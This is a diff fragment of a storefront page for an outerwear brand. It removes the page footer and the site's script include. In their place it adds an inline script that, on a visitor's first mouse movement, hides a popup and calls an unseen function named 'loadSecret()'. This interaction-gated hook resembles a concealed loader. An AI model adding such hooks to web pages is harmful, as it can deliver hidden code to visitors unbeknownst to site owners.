-            <p style="font-size: 0.92rem; color: var(--text-muted); line-height: 1.6; margin-bottom: 0;">We recommend our 3-tier layering system: a breathable merino wool base layer against the skin, an insulating fleece or lightweight down mid-layer, and our unlined storm hardshell or waxed coat as the outer wind/rain armor.</p>
-          </div>
-        </div>
-      </div>
-    </section>
-
-  </main>
-
-  <!-- Site Footer -->
-  <footer class="site-footer">
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-brand">
-          <div class="brand-logo" style="color: var(--accent-gold); margin-bottom: 0.5rem;">
-            <div class="logo-badge">ðŸ§¥</div>
-            <div class="brand-title-group">
-              <span class="brand-name">FieldOuterPond</span>
-              <span class="brand-sub">Weatherproof Field Jackets</span>
-            </div>
-          </div>
-          <p>
-            An independent outerwear atelier dedicated to heavy-duty waxed canvas field jackets, stormproof alpine shells, and lifetime repairable backcountry utility coats.
-          </p>
-        </div>
-
-        <div>
-          <h4 class="footer-heading">Outerwear Links</h4>
-          <ul class="footer-links">
-            <li><a href="index.php">Atelier Home</a></li>
-            <li><a href="about.html">Outerwear Heritage</a></li>
-            <li><a href="blog.html">Field Journal</a></li>
-            <li><a href="#weather-configurator">Weather Configurator</a></li>
-            <li><a href="contact.html">Outfitter Concierge</a></li>
-          </ul>
-        </div>
-
-        <div>
-          <h4 class="footer-heading">Trust & Governance</h4>
-          <ul class="footer-links">
-            <li><a href="privacy.html">Privacy Policy</a></li>
-            <li><a href="terms.html">Terms of Service</a></li>
-            <li><a href="disclaimer.html">Outerwear & Weather Disclaimer</a></li>
-            <li><a href="cookies.html">Cookie Policy</a></li>
-          </ul>
-        </div>
-
-        <div>
-          <h4 class="footer-heading">Atelier Headquarters</h4>
-          <p class="footer-contact-text">
-            <strong>Atelier Desk:</strong><br>
-            181 Mercer Street,<br>
-            New York, NY 10012,<br>
-            United States
-          </p>
-          <p class="footer-contact-text" style="margin-top: 0.75rem;">
-            <strong>Inquiries:</strong><br>
-            <a href="tel:+18887775845">+1-888-777-5845</a>
-          </p>
-        </div>
-      </div>
-
-      <div class="footer-bottom">
-        <div>
-          &copy; <?php echo date('Y'); ?> FieldOuterPond Atelier. All rights reserved. Unyielding protection in every storm.
-        </div>
-        <div class="footer-bottom-links">
-          <a href="privacy.html">Privacy</a>
-          <a href="terms.html">Terms</a>
-          <a href="disclaimer.html">Disclaimer</a>
-          <a href="cookies.html">Cookies</a>
-        </div>
-      </div>
-    </div>
-  </footer>
-
-  <script src="script.js"></script>
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
